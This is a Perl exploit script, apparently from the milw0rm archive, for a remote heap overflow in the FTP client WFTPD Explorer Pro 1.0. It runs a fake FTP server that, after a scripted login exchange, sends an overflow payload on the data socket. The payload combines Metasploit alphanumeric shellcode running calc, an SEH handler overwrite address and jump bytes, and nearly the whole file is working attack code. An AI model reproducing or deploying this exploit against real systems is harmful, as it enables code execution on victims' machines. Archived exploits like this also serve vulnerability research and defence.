#!/usr/bin/perl
#
# WFTPD Explorer Pro 1.0 Remote Heap Overflow Exploit
# ---------------------------------------------------
# Exploit by SkD                 (skdrat@hotmail.com)
#
# This is a remote heap overflow exploit for 
# WFTPD Explorer Pro 1.0 by Texas Imperial Software.
# (Vendors website = http://www.wftpd.com)
#
# Tested on Windows 2000 SP4.
#
# I haven't used the more common methods of overwritting
# PEB or UEF as it seemed both of them were not called
# when the heap was overflowed, probably due to clean
# clear ups when the overflow is detected. So I chose
# to overwrite a local SEH handler address. I have tested
# it numerously and the success rate is 100% in Win2k Sp4.
# The exploit is basically based on the PoC by r4x
# and it recreates the scenario but also exploits it by
# creating two sockets, which the vital point is the 
# data socket.
# 
# Enjoy it ladies & gents.
# 
# Greets fly out to InTeL & str0ke.
#
# Note: Author has no responsibility over the damage you do
#       with this!

use IO::Socket;
use warnings;
use strict;

print "[x] WFTPD Explorer Pro 1.0 Remote Heap Overflow Exploit\n";
print "[x] Exploit by SkD (skdrat@ hotmail.com)\n";

my @requests  =
	("USER", "PASS", "TYPE", "PWD", "PASV", "LIST");
my @response =
	("331 Password required.\r\n", "230 User logged in.\r\n", "200 Type set to I.\r\n",
	 "257 '/' is current directory.\r\n", "227 Entering Passive Mode (127,0,0,1,100,100).\r\n",
	 "150 Opening ASCII mode data connection for file list.\r\n");

# win32_exec -  EXITFUNC=thread CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
my $shellcode =
	          "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
	          "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
	          "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
	          "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
	          "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34".
	          "\x42\x50\x42\x30\x42\x50\x4b\x38\x45\x34\x4e\x43\x4b\x38\x4e\x47".
	          "\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x58\x4f\x54\x4a\x41\x4b\x48".
	          "\x4f\x35\x42\x42\x41\x50\x4b\x4e\x49\x54\x4b\x58\x46\x43\x4b\x58".
	          "\x41\x30\x50\x4e\x41\x53\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c".
	          "\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e".
	          "\x46\x4f\x4b\x33\x46\x45\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x58".
	          "\x4f\x35\x46\x52\x41\x50\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x44".
	          "\x4b\x48\x4f\x55\x4e\x31\x41\x30\x4b\x4e\x4b\x38\x4e\x31\x4b\x48".
	          "\x41\x30\x4b\x4e\x49\x38\x4e\x55\x46\x52\x46\x50\x43\x4c\x41\x43".
	          "\x42\x4c\x46\x36\x4b\x38\x42\x54\x42\x43\x45\x38\x42\x4c\x4a\x47".
	          "\x4e\x50\x4b\x38\x42\x34\x4e\x50\x4b\x38\x42\x57\x4e\x31\x4d\x4a".
	          "\x4b\x48\x4a\x36\x4a\x30\x4b\x4e\x49\x30\x4b\x58\x42\x38\x42\x4b".
	          "\x42\x30\x42\x30\x42\x50\x4b\x58\x4a\x56\x4e\x33\x4f\x45\x41\x33".
	          "\x48\x4f\x42\x56\x48\x45\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x47".
	          "\x42\x45\x4a\x46\x4f\x4e\x50\x4c\x42\x4e\x42\x56\x4a\x36\x4a\x59".
	          "\x50\x4f\x4c\x48\x50\x50\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x36".
	          "\x4e\x36\x43\x56\x42\x30\x5a";

my $heapend =     #The heap sometimes needs to be fed (end) with strange bytes ;)
	          "\x83\xc5\x7a\x83\xc5\x7a\x8b\x45\x00\xbd\x68\xc3\xd3\x55\xa7\x86".    #No specific instructions
		  "\xb9\x42\x42\x42\x42\x40\x40\x40\x40\x39\x08\x75\xf8\xff\xe0\x2f".    #No specific instructions
		  "\xef\xde\x50\xc6\xab\x54\xc3\x48\x9c\x4d\xa7\x9c\xf3\x54\xc7\x8a".    #No specific instructions
		  "\x58\x61\xa7\xc2\x3d\x64\xec\x5a\x7f\xd1\xec\xb7\xd4\x94\xe6\xce".    #No specific instructions
		  "\xd2\x97\xc7\x37\xe8\x01\x08\xc7\xa6\xb0\xa7\x9c\xf7\x54\xc7\xa5".    #No specific instructions
		  "\x58\x59\x67\x48\x8c\x49\x2d\x28\x58\x49\xa7\xc2\x38\xdc\x70\xe7".    #No specific instructions
		  "\xd7\x96\x1d\x03\xb7\xde\x6c\xf3\x56\x95\x54\xcf\x58\x15\x20\x48".    #No specific instructions
		  "\xa3\x49\x81\x48\xbb\x5d\xc7\xca\x58\xd5\x9c\xc3\xd3\x55\xa7\xab".    #No specific instructions
		  "\xef\x0a\x1d\x35\xb3\x03\xa5\x3b\x50\x95\x57\x93\xbb\xba\xe2\x23".    #No specific instructions
		  "\xb3\x3d\xb4\x3d\x59\x5b\x7b\x3c\x34\x36\x4d\xaf\xb0\x55\x2c\xc3";    #No specific instructions


my $overflow1 =     "\x41" x (1024 - length($shellcode));
my $overflow2 =     "\x42" x 144;
my $overwriteaddr = "\x18\xfe\x91\x00"; #SEH Handler Address, will be called after a deliberate exception
my $shellcodeaddr = "\xd0\x7a\xd3\x00"; #Address of a huge sled of 0x41 bytes that will lead to the shellcode
my $heappart =      "\x41" x 6 ."\xEB\x08".$shellcodeaddr.$overwriteaddr."\x41" x 6 ."\xEB\x08"; #JMPs here are used in some cases
my $payload =       $overflow1.$shellcode.$heappart.$shellcodeaddr.$overwriteaddr.
	            $heapend.$overflow2."\r\n"; #Heap overflow packet payload ;)

while(1)
{
	my $sock1=new IO::Socket::INET(Listen=>1,LocalAddr => "127.0.0.1",LocalPort=>21,Proto=>'tcp');
	my $sock2=new IO::Socket::INET(Listen=>1,LocalAddr => "127.0.0.1",LocalPort=>25700,Proto=>'tcp');
	die unless $sock1;
	die unless $sock2;
	print "[x] Waiting for clients ...\n";
	my $s1;
	my $s2;
	while($s1=$sock1->accept()){
		print "\t[x] Got a client !\n";
		print $s1 "220 Welcome to SkD FTPDAEMON\r\n";
		while(my $request = <$s1>){
                	my @arr = split("\x20", $request);
			print "\t\t[x] Request = ".$arr[0]."\n";
                	if(length($arr[0]) == 0){
	                        print $s1 "502 Command not implemented.\r\n";
                                sleep(0.25);
	                } elsif($arr[0] eq $requests[0]){
	                        print $s1 $response[0];
                                sleep(0.25);
	                } elsif($arr[0] eq $requests[1]){
	                        print $s1 $response[1];
                                sleep(0.25);
	                } elsif($arr[0] eq $requests[2]){
	                        print $s1 $response[2];
                                sleep(0.25);
	                } elsif($arr[0] eq $requests[3]){
                                print $s1 $response[3];
                                sleep(0.25);
	                } elsif($arr[0] eq $requests[4]){
                        	print $s1 $response[4];
                                sleep(0.25);
                                $s2 = $sock2->accept();
                                print "\t\t[x] Data socket connected!\n";
	                } elsif($arr[0] eq $requests[5]){
                        	print "\t\t[x] Sending exploit ;)!\n";
                                print $s1 $response[5];
                                sleep(1);
                                print $s2 $payload;
	                        sleep(1);
                                print "\t[x] Exploitation done.\n";
	                        last;
	                }
		}
                print "\t[x] Client disconnected.\n";
                close $sock1; #Clean up socket1
                close $sock2; #Clean up socket2
                last;
	}
}

# milw0rm.com [2009-01-29]